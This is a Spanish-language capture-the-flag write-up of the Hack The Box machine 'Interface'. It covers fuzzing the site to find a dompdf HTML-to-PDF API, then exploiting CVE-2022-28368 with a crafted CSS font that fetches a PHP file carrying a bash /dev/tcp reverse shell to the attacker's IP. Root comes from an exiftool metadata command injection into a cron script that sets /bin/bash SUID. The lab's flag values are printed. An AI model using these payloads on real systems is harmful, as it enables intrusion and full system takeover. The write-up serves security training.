---
layout: single
title: Interface - Hack The Box
excerpt: "En este post vamos a estar realizando la maquina Interface de categoria Media de la plataforma de hackthebox mediante un subdominio que encontramos de la maquina tendremos que emplear fuzzing asta descubrir una herramienta que convierte html a pdf apartir de eso encontramos una vulnerabilidad donde podemos conseguir un RCE para la escalada de privilegios nos aprovecharemos de una tarea cron para poner la Bash SUID y ser root"
date: 2023-05-13
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-interface/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Fuzzing
  - Subdomain Enumeration
  - CVE-2022-28368
  - Cron Job
---


```bash
❯ ping -c 1 10.10.11.200
PING 10.10.11.200 (10.10.11.200) 56(84) bytes of data.
64 bytes from 10.10.11.200: icmp_seq=1 ttl=63 time=77.2 ms

--- 10.10.11.200 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 77.189/77.189/77.189/0.000 ms
❯ whichSystem.py 10.10.11.200

10.10.11.200 (ttl -> 63): Linux
```

## PortScan 

```bash
❯ nmap -sCV -p22,80 10.10.11.200 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 16:11 CST
Nmap scan report for 10.10.11.200
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion 

Vamos a usar al herramienta `whatweb` para ver las tecnologias que corren en el servicio http que ofrece el puerto 80 

```ruby
❯ whatweb http://10.10.11.200
http://10.10.11.200 [200 OK] Country[RESERVED][ZZ], Email[contact@interface.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.200], Script[application/json], UncommonHeaders[content-security-policy], X-Powered-By[Next.js], nginx[1.14.0]
```

Si vemos la pagina web vemos que nos dicen que el sitio esta en mantenimiento asi que vamos a hacer **Fuzzing** para encontrar otras rutas si es que las hay 

![](/assets/images/htb-writeup-interface/web1.png)

Bueno si aplicamos **Fuzzing** pues no encontramos nada 

```bash
❯ gobuster dir -u http://10.10.11.200/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.200/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/05/11 16:20:05 Starting gobuster in directory enumeration mode
===============================================================

                                 
===============================================================
```

Si empleamos la herramienta **curl** y hacemos una peticion ala web vemos que nos da el siguiente **output** y ya vemos un subdominio `prd.m.rendering-api.interface.htb`

```bash
❯ curl -s -I 'http://10.10.11.200'
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 11 May 2023 22:23:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 6359
Connection: keep-alive
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
X-Powered-By: Next.js
ETag: "i8ubiadkff4wf"
Vary: Accept-Encoding
```

Voy a agregar al `/etc/hosts` el dominio **interface.htb** para ver si vemos que en la web cambia algo 

```bash
❯ echo "10.10.11.200 interface.htb" | sudo tee -a /etc/hosts
10.10.11.200 interface.htb
❯ ping -c 1 interface.htb
PING interface.htb (10.10.11.200) 56(84) bytes of data.
64 bytes from interface.htb (10.10.11.200): icmp_seq=1 ttl=63 time=79.7 ms

--- interface.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 79.744/79.744/79.744/0.000 ms
```

Pero nos dice lo mismo 

![](/assets/images/htb-writeup-interface/web2.png)

Tambien vamos a agregar al `/etc/hosts` el dominio que habiamos encontrado de antes cuando hicimos la peticion con **curl**

```bash
❯ echo "10.10.11.200 prd.m.rendering-api.interface.htb" | sudo tee -a /etc/hosts
10.10.11.200 prd.m.rendering-api.interface.htb
❯ ping -c 1 prd.m.rendering-api.interface.htb
PING prd.m.rendering-api.interface.htb (10.10.11.200) 56(84) bytes of data.
64 bytes from interface.htb (10.10.11.200): icmp_seq=1 ttl=63 time=77.0 ms

--- prd.m.rendering-api.interface.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 76.995/76.995/76.995/0.000 ms
```

Si hacemos una peticion con **curl** a este **subdominio** nos damos cuenta que en la respuesta nos dice `File not found` 

```bash
❯ curl -s 'http://prd.m.rendering-api.interface.htb'
File not found.

```

Vamos a hacer `Fuzzing` en el **subdominio** para ver si encontramos algo nuevo y vemos `vendor` lo cual ya es interesante

```bash
❯ wfuzz -c --hc=404 --hh=182 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://prd.m.rendering-api.interface.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000001468:   403        1 L      2 W        15 Ch       "vendor" 
```

Ahora si hacemos `Fuzzing` en el directorio **vendor** 

```bash
❯ wfuzz -c --hc=404 --hh=182 -t 200 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt http://prd.m.rendering-api.interface.htb/vendor/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/vendor/FUZZ
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000009010:   403        1 L      2 W        15 Ch       "dompdf"                                                       
000023245:   403        1 L      2 W        15 Ch       "composer"     
```

Ya vemos 2 rutas que son **dompdf** y **composer** si buscamos en internet que es **dompdf** nos dice esto

![](/assets/images/htb-writeup-interface/web3.png)

Vamos a buscar vulnerabilidades de esta herramienta que lo que hace es crear documentos PDF a HTML 

```bash
❯ searchsploit dompdf
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                          | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                                                    | php/webapps/14851.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                                             | php/webapps/35443.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

>Bueno despues de estar buscando otros compañeros que realizaron la maquina antes que yo me dijeron que hay otro directorio llamado **api** pero es raro por que al hacer **fuzzing** no lo reporto ninguna herramienta, pero bueno ahora que sabemos esto pues podemos aplicar **fuzzing** al directorio, al igual en el subdominio pues vimos que **api** forma parte de el asi que bueno sigamos
>Gracias a que IppSec subio el video de la maquina resolviendola pude ver por que no se mostraba y tenemos que usar `ffuf` para ver el **api**

Ahora si podemos ver **api** que es el que nos faltaba 

```bash
❯ ./ffuf -u http://prd.m.rendering-api.interface.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://prd.m.rendering-api.interface.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

[Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 263ms]
    * FUZZ: api

```

Bueno ahora vamos a aplicar `Fuzzing` al directorio `api` pero no encontramos nada

```bash
❯ wfuzz -c --hc=404 --hh=50 --hw=13 -t 200 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt http://prd.m.rendering-api.interface.htb/api/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/FUZZ
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================
```

Como no nos reporta nada `wfuzz` tambien tiene una opcion de poder hacer `fuzzing` mediante peticiones por el metodo `Post` o `GET` vamos a usar `Post` y ya vemos la ruta `html2pdf` que al parecer cuando investigamos vimos que **dompdf** transforma **HTML a PDF**

```bash
❯ wfuzz -c --hc=404 --hh=50 --hw=13 -X POST -t 200 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt http://prd.m.rendering-api.interface.htb/api/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/FUZZ
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000006080:   422        0 L      2 W        36 Ch       "html2pdf"   
```

Sabiendo esto podemos hacer una peticion con `curl` para ver mas informacion y nos esta pidiendo parametros

```bash
❯ curl -s -i -X POST http://prd.m.rendering-api.interface.htb/api/html2pdf
HTTP/1.1 422 Unprocessable Entity
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 12 May 2023 00:11:21 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status_text":"missing parameters"}#
```

Para saber el parametro que nos hace falta podemos emplear la herramienta `Wfuzz` ya que tambien podemos hacer `fuzzing` en esos parametros para saber lo que nos falta que eso lo hacemos con el parametro `-d` que corresponde a **-d postdata               : Use post data (ex: "id=FUZZ&catalogue=1")** 


```bash
❯  wfuzz -c --hh=36 -X POST -t 200 -d '{"FUZZ":"FUZZ"}' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt http://prd.m.rendering-api.interface.htb/api/html2pdf
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/html2pdf
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000145:   200        0 L      0 W        0 Ch        "html - html"         
```

Para ver si funciona podemos usar otra vez la herramienta `curl` para ver la respuesta y nos reporta un **export.pdf** 

```bash
❯ curl -s -X POST -i http://prd.m.rendering-api.interface.htb/api/html2pdf -H "Content-Type: application/json" -d '{"html":"test"}'
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 12 May 2023 00:23:06 GMT
Content-Type: application/pdf
Content-Length: 0
Connection: keep-alive
X-Local-Cache: miss
Cache-Control: public
Content-Transfer-Encoding: Binary
Content-Disposition: attachment; filename=export.pdf
```

## CVE-2022-28368 

 Si investigamos vemos que `dompdf` hay una vulnerabilidad de un `RCE` <https://security-tracker.debian.org/tracker/CVE-2022-28368> 

<https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf> 

Para explotar esta vulnerabilidad podemos usar el siguiente repositorio donde nos explican como funciona la vulnerabilidad de igual manera <https://github.com/positive-security/dompdf-rce>

```bash
❯ git clone https://github.com/positive-security/dompdf-rce.git
Clonando en 'dompdf-rce'...
remote: Enumerating objects: 343, done.
remote: Counting objects: 100% (343/343), done.
remote: Compressing objects: 100% (271/271), done.
remote: Total 343 (delta 67), reused 329 (delta 62), pack-reused 0
Recibiendo objetos: 100% (343/343), 3.99 MiB | 5.51 MiB/s, listo.
Resolviendo deltas: 100% (67/67), listo.
```

Ahora lo que tenemos que hacer es editar el archivo `exploit.css` indicando nuestra `ip` de atacante

```bash
❯ catn exploit.css
@font-face {
    font-family:'exploitfont';
    src:url('http://10.10.14.115/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
```

Vemos que vamos a estar ofreciendo el archivo **exploit_font.php** ya que al hacer una peticion a ese archivo se va a ejecutar una accion y esa accion sera una reverse shell 

<https://positive.security/blog/dompdf-rce>

Ahora vamos a editar el archivo `exploit_fond.php` para indicar la reverse shell 

```bash
❯ catn exploit_font.php

� dum1�cmap
           `�,glyf5sc��head�Q6�6hhea��($hmtxD
loca
Tmaxp\ nameD�|8dum2�
                     -��-����
:83#5:08��_<�
             @�8�&۽
:8L��

:D

6				s
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.115/443 0>&1'") ?>
<?php phpinfo(); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.115/443 0>&1'") ?>
```

Vamos a usar `burpsuite` para capturar la peticion y poder manipular la data 

```bash
❯ burpsuite &>/dev/null & disown
[1] 141900
```

Ahora vamos a poner un servidor http con python3 

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Ahora vamos a enviar una petición con el parámetro _html_ con la etiqueta de link para que haga una petición al archivo _css_ que editamos que es donde esta entablada nuestra reverse shell 

![](/assets/images/htb-writeup-interface/web5.png)

Nos esta haciendo 2 peticiones

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.200 - - [11/May/2023 18:49:44] "GET /exploit.css HTTP/1.0" 200 -
10.10.11.200 - - [11/May/2023 18:49:44] "GET /exploit_font.php HTTP/1.0" 200 -
```

El nombre del archivo PHP será igual, pero al final pondrá una cadena _hasheada_ con la _URL_ de la petición. Para saber cuál es el nombre debemos hacer lo siguiente:

```bash
❯ echo -n 'http://10.10.14.115/exploit_fond.php' | md5sum
2878bcfd946950131a7b1b63e1ba4f6d  -
```

Siguiendo las instrucciones nos vamos a poner en escucha con `netcat`

```bash
❯ nc -nlvp 443
listening on [any] 443 ...

```

Con `curl` vamos a hacer la peticion al archivo php malicioso que hemos subido 

```bash
❯ curl -s -X POST -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_2878bcfd946950131a7b1b63e1ba4f6d.php
```

Y ganamos acceso ala maquina **Tube que hacer demasiadas veces el intento asta que funciono la maquina nose que paso pero bueno si no te sale ala primera intentalo de nuevo y sigue las instrucciones del repositorio**

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.115] from (UNKNOWN) [10.10.11.200] 40774
bash: cannot set terminal process group (1385): Inappropriate ioctl for device
bash: no job control in this shell
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$
```

## User Flag

Despues de hacer un tratamiento de la `tty`

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
ENTER
```

Vemos la flag 

```bash
www-data@interface:/$ find / -name user.txt 2>/dev/null
/home/dev/user.txt
www-data@interface:/$ cat /home/dev/user.txt
f3bf3d4441b63b6ded53910e030c4b52
www-data@interface:/$
```

## Escalada de privilegios

Si vemos binarios SUID no vemos gran cosa

```bash
www-data@interface:/$ find \-perm -4000 2>/dev/null
./bin/mount
./bin/ping
./bin/fusermount
./bin/umount
./bin/su
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/sudo
./usr/bin/newgidmap
./usr/bin/traceroute6.iputils
./usr/bin/newgrp
./usr/bin/newuidmap
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/at
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
```

Si buscamos por tareas cron con **pspy** <https://github.com/DominicBreuker/pspy/releases>

![](/assets/images/htb-writeup-interface/web6.png)

En esa ruta hay un script en bash que comprueba que el directorio tmp que si en caso de que en los metadatos de algun archivo cualquiera existe algo de **dompdf** lo borra ademas esta empleando la herramienta `exiftool` 

```bash
www-data@interface:/tmp$ cat /usr/local/sbin/cleancache.sh 
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done

www-data@interface:/tmp$ 
```

Vamos a crear un archivo para poner la bash SUID 

```bash
www-data@interface:~$ nano pwned.sh
www-data@interface:~$ cat pwned.sh 
#!/bin/bash

chmod u+s /bin/bash
www-data@interface:~$ 
www-data@interface:~$ chmod +x pwned.sh
```

Ahora en nuestra maquina victima necesitaremos una imagen `jpeg` para usar la herramienta `exiftool`

Ahora como vimos en el script esta usando el campo `Producer` y usaremos ese payload para añadir el campo ala ruta del archivo

![](/assets/images/htb-writeup-interface/zi.png)

```bash
┌─[root@parrot]─[/home/miguel7/Hackthebox/Interface/exploits]
└──╼ #exiftool -Producer='a[$(/var/www/pwned.sh>&2)]' xd.jpeg 
    1 image files updated
```

Ahora movemos la imagen ala maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.200 - - [12/May/2023 00:38:32] "GET /xd.jpeg HTTP/1.1" 200 -

```

```bash
www-data@interface:~$ wget http://10.10.14.115/xd.jpeg
--2023-05-12 06:38:31--  http://10.10.14.115/xd.jpeg
Connecting to 10.10.14.115:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 283178 (277K) [image/jpeg]
Saving to: 'xd.jpeg'

xd.jpeg                         100%[=======================================================>] 276.54K   725KB/s    in 0.4s    

2023-05-12 06:38:31 (725 KB/s) - 'xd.jpeg' saved [283178/283178]

www-data@interface:~$ mv xd.jpeg /tmp
www-data@interface:~$
```

Ahora tenemos que esperar a que la **bash** sea `SUID`

```bash
www-data@interface:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
www-data@interface:~$ 

```

## Root flag 

Ahora ya somos root 

```bash
www-data@interface:~$ bash -p
bash-4.4# whoami
root
```

```bash
bash-4.4# cat root.txt 
f36113d4d5376dacce1e7bfaa4fb00df
bash-4.4#
```

![](/assets/images/htb-writeup-interface/final.png)
